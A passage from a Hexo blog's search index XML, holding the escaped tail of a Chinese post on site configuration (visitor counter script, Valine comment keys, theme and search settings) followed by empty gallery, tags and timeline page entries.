src=&quot;//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css&quot;&gt;Total &lt;span id=&quot;busuanzi_value_site_pv&quot;&gt;&lt;i class=&quot;fa fa-spinner fa-spin&quot;&gt;&lt;/i&gt;&lt;/span&gt; views.您是Sparrow博客的第&lt;span id=&quot;busuanzi_value_site_uv&quot;&gt;&lt;i class=&quot;fa fa-spinner fa-spin&quot;&gt;&lt;/i&gt;&lt;/span&gt;个小伙伴.换个简洁评论valinehttps://github.com/litten/hexo-theme-yilia/pull/646_config.yml : valine:  appid:  #Leancloud应用的appId   XzzzFqxY7zSnAm9am6FHg6do-gzGzoHsz appkey:  #Leancloud应用的appKey   aaBboz6UbNeJnPowxKNNDTm2https://material.viosey.com/docslanguage: zh-CNsearch:    path: search.xml    field: allbaidu_site_id: categories:- 技术相关tags:- PS3- Gamespages:    标签云:         link: &quot;/tags&quot;            icon: person            divider: falsehexo-front-matter-excerpt 这个插件，默认是读取 &lt;!-- more --&gt;</code></pre>]]></content>
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
    </entry>
    
  
  
    
    <entry>
      <title>gallery</title>
      <link href="/gallery/index.html"/>
      <url>/gallery/index.html</url>
      <content type="html"><![CDATA[]]></content>
    </entry>
    
    <entry>
      <title>tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      <content type="html"><![CDATA[]]></content>
    </entry>
    
    <entry>
      <title>timeline</title>
      <link href="/timeline/index.html"/>
      <url>/timeline/index.html</url>
      <content type="html"><![CDATA[]]></content>
    </entry>
    
  
</search>
